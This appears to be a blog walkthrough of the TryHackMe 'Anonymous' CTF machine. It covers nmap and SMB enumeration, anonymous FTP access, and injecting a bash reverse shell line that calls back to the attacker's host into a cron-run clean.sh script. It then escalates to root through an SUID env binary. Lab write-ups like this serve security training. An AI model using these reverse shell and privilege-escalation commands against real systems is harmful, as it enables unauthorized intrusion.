---
layout: post
author: n0nu11
title: "[TryHackMe] Anonymous Walkthrough"
date: 2020-06-05T15:10:18.331Z
published: true
tags:
  - tryhackme
  - solutions
  - CTF
  - suid
  - privilege escalation
  - ftp
  - cron jobs
  - smb
image: /assets/images/05062020-anonymous/anonymous0.png
description: Anonymous is a beginner CTF privesc challenge. You need to find 2 flags to complete the hack. This machine teaches us to gain access using cron jobs and privilege escalation using SUID binary.
category:
  - tryhackme
---

# Introduction

Anonymous is a beginner CTF privesc challenge. You need to find 2 flags to complete the hack. This machine teaches us to gain access using cron jobs and privilege escalation using SUID binary.

![anonymous image](/assets/images/05062020-anonymous/anonymous0.png)

# Enumeration

>Enumeration is defined as the process of extracting user names, machine names, network resources, shares, and services from a system. ... The gathered information is used to identify the vulnerabilities or weak points in system security and tries to exploit the System gaining phase.

Let's start the enumeration process. Heuristic tinkering/passive scanning shows that there was no webserver running but FTP and SSH is running.


## Nmap

>Nmap is a free and open-source network scanner created by Gordon Lyon. Nmap is used to discover hosts and services on a computer network by sending packets and analyzing the responses. Nmap provides a number of features for probing computer networks, including host discovery and service and operating system detection.

Aggressive Nmap scan shows us the ports `21,22,139,445` are open.

`nmap -p- -A -T4 10.10.3.190 -oN nmap/full`

![nmap](/assets/images/05062020-anonymous/anonymous1.1.png)

The __FTP__, __SMB__ and __SSH__ ports are open. let's try enumerating the SMB shares first.

## SMB

let's check the shares available.

![enumeration](/assets/images/05062020-anonymous/anonymous5.png)

Looks like `pics` share is available, with the comment `My SMB Share Directory for Pics`.

__Pics__? maybe something hidden inside using steganography?. 

![smb file listing](/assets/images/05062020-anonymous/anonymous6.png)

We can see 2 image files `corgo2.jpg` and `puppos.jpeg`. let's download it to our machine.

![downloading files](/assets/images/05062020-anonymous/anonymous7.png)


I tried `binwalk` on both files, turned out only `puppos.jpeg` file had something embedded inside. a TIFF file


![binwalk](/assets/images/05062020-anonymous/anonymous8.png)

let's try to extract the embedded contents.

![binwalk extraction](/assets/images/05062020-anonymous/anonymous9.png)

The `C` file is the one embedded inside `puppos.jpeg`. I checked the file for some information but I got nothing in the end. 

![rabbit hole](/assets/images/05062020-anonymous/anonymous10.png)

It was a rabbit hole.

![no results found](https://media.giphy.com/media/zLCiUWVfex7ji/giphy.gif)

Let's move on to FTP and check if we get something interesting.


## FTP

Let's check for anonymous login via FTP.

![ftp](/assets/images/05062020-anonymous/anonymous2.png)

It worked. let's check the contents.

![ftp files list](/assets/images/05062020-anonymous/anonymous3.png)


there are 3 interesting files `clean.sh`, `removed_files.log` and `to_do.txt`.

let's download the files to our kali machine.

![get files from ftp](/assets/images/05062020-anonymous/anonymous4.png)

#### FILE: clean.sh

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi

```

#### FILE: removed_files.log

```bash
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```

#### FILE: to_do.txt

```
I really need to disable the anonymous login...it's really not safe

```

Indeed it is. Too late bruh! I already got the file 😆.

![too late](https://media.giphy.com/media/dZjlm0hDSBQYbDZQc9/giphy.gif)

Looks like the `clean.sh` file is running somewhere in the machine repeatedly that is generating that log file and it seems like we have write permission in FTP. What if we inject our code in the `clean.sh` file and get a reverse shell?

![anonymous](https://media.giphy.com/media/vJc55OQZMOojS/giphy.gif)

---

# Gaining Access: Reverse Shell


First, we will mount the FTP as a file share and edit files using `curlFTPfs`.

![curlFTPfs](/assets/images/05062020-anonymous/anonymous11.png)

add `bash -i >& /dev/tcp/<ip>/<port> 0>&1` in `clean.sh` file.


```bash
#!/bin/bash
bash -i >& /dev/tcp/<ip>/<port> 0>&1
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi

```

>Replace the \<ip\> and \<port> with your ip and port number.

now let's open a Netcat listener using `nc -lvnp <port>`. wait for the `clean.sh` to run so that we can get a reverse shell.

![5 hours later](https://media.giphy.com/media/xUPJPop2o56Sv8p8TS/giphy.gif)

![netcat listener](/assets/images/05062020-anonymous/anonymous13.png)

And we got it.

![we got him gif](https://media.giphy.com/media/iOm1xOSfAtPzmPXJqH/giphy.gif)


The file `user.txt` contains the user flag.

![user flag](/assets/images/05062020-anonymous/anonymous14.png)

---

# Privilege Escalation

`sudo -l` asked for a password. Since we don't know the password we can skip it.

This time I used [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) script to enumerate the Linux machine.

![linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/peass.png)

When checking for SUID binaries. we can see `/usr/bin/env` has setuid bit set with **root** privileges. This means we can get a root shell by using `env` command.

![setuid binary](/assets/images/05062020-anonymous/anonymous15.png)
![setuid flag](/assets/images/05062020-anonymous/anonymous16.png)

Let's head to [gtfobins](https://gtfobins.github.io/gtfobins/env/) for the escalation command.


![gtfobin command](/assets/images/05062020-anonymous/anonymous17.png)

lets try executing `/usr/bin/env /bin/sh -p`

![priv esc](/assets/images/05062020-anonymous/anonymous18.png)

And we got a **root** shell.

With the root shell, we can read the contents of the root directory *(Actually we can read anything)* which contains the root flag.

![root flag](/assets/images/05062020-anonymous/anonymous19.png)

![game over](https://media.giphy.com/media/3og0ILLVvPp8d64Jd6/giphy.gif)

---

# Summary

- Nmap scan shows SSH, FTP and SMB ports are open
- pics share was available in SMB which contains 2 image files.
- The image files are nothing but the rabbit holes.
- FTP had 3 files clean.sh, removed_files.log and to_do.txt
- We identified that clean.sh was running somewhere, it may be using cron jobs.
- To gain access, we first mount the FTP as a filesystem and injected reverse shell command.
- With Netcat listener listening on the local kali machine, we got a reverse shell.
- The user.txt contained a user flag.
- For privilege escalation, the host machine is enumerated using linpeas script.
- It showed the /usr/bin/env was set with setuid as root.
- Using the command from gtfobins, we use env command to escalate root privilege.
- The root flag was found in /root directory.

---


# Before you leave

If you have any constructive criticism or any questions, please drop an email at [root@n0nu11.tech](mailto:root@n0nu11.tech) or ping me in [instagram](https://instagram.com/dvlp.er). I'll be happy to hear your feedback.

Follow me on  [ <i class="fa fa-github"></i> Github](https://github.com/devwaseem), [<i class="fa fa-twitter"></i> Twitter](https://twitter.com/iamwaseem99), [<i class="fa fa-instagram"></i> Instagram](https://www.instagram.com/dvlp.er/), [<i class="fa fa-facebook"></i> Facebook](https://www.facebook.com/dvlprwaseem), [<i class="fa fa-linkedin"></i> LinkedIn](https://www.linkedin.com/in/devwaseem/).

![bye](https://media.giphy.com/media/42D3CxaINsAFemFuId/giphy.gif)